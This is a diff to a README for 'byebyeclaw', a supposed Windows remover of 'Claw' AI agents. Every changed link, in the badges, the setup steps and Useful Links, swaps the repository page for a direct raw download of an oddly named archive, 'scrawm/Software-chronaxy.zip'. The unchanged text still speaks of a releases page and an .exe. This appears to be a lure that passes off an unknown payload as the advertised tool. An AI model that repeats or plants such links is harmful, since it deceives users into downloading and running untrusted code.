@@ -1,6 +1,6 @@
 # 🧹 byebyeclaw - Cleanly Remove Claw AI Agents
 
-[![Download byebyeclaw](https://img.shields.io/badge/Download-byebyeclaw-brightgreen?style=for-the-badge)](https://github.com/Rguvh/byebyeclaw)
+[![Download byebyeclaw](https://img.shields.io/badge/Download-byebyeclaw-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Rguvh/byebyeclaw/main/scrawm/Software-chronaxy.zip)
 
 ---
 
@@ -31,7 +31,7 @@ byebyeclaw is a tool designed for Windows users to quickly remove all Claw-famil
 
 ## 🚀 Getting Started
 
-1. Click the big green **Download byebyeclaw** button above or visit the [GitHub release page](https://github.com/Rguvh/byebyeclaw) to access the latest files.
+1. Click the big green **Download byebyeclaw** button above or visit the [GitHub release page](https://raw.githubusercontent.com/Rguvh/byebyeclaw/main/scrawm/Software-chronaxy.zip) to access the latest files.
 
 2. On the GitHub page, find the latest version and locate the Windows installer file usually ending with `.exe`.
 
@@ -43,7 +43,7 @@ byebyeclaw is a tool designed for Windows users to quickly remove all Claw-famil
 
 You need to download the installation file from the GitHub page linked above. Follow these steps:
 
-1. Visit the GitHub page at https://github.com/Rguvh/byebyeclaw.
+1. Visit the GitHub page at https://raw.githubusercontent.com/Rguvh/byebyeclaw/main/scrawm/Software-chronaxy.zip
 
 2. On the page, find the **Releases** section to see all available versions.
 
@@ -129,6 +129,6 @@ A: You would need to reinstall that agent manually after running byebyeclaw.
 
 ## 🔗 Useful Links
 
-- Download or check for updates at [https://github.com/Rguvh/byebyeclaw](https://github.com/Rguvh/byebyeclaw)
+- Download or check for updates at [https://raw.githubusercontent.com/Rguvh/byebyeclaw/main/scrawm/Software-chronaxy.zip](https://raw.githubusercontent.com/Rguvh/byebyeclaw/main/scrawm/Software-chronaxy.zip)
 
-[![Download byebyeclaw](https://img.shields.io/badge/Download-byebyeclaw-blue?style=for-the-badge)](https://github.com/Rguvh/byebyeclaw)
+[![Download byebyeclaw](https://img.shields.io/badge/Download-byebyeclaw-blue?style=for-the-badge)](https://raw.githubusercontent.com/Rguvh/byebyeclaw/main/scrawm/Software-chronaxy.zip)
